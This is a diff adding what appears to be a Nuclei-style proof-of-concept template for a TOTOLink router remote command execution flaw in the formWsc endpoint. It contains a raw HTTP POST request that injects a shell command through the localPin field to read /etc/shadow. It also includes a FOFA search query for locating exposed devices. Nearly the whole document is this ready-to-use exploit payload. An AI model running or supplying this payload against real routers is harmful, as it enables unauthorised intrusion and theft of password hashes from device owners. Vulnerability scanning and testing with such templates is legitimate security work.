@@ -1,0 +1,26 @@
+id: poc-kpdgagltwyewwyrl
+info:
+  name: TOTOLink formWsc存在远程命令执行漏洞.docx
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kpdgagltwyewwyrl'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kpdgagltwyewwyrl
+    fofa: title="TOTOLINK"
+http:
+- raw:
+  - 'POST /boaform/formWsc HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    targetAPMac=001A2B3C4D5E&targetAPSsid=3232&submit-url=aaaaaa&localPin=aaaa%20||%20cat%20/etc/shadow'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
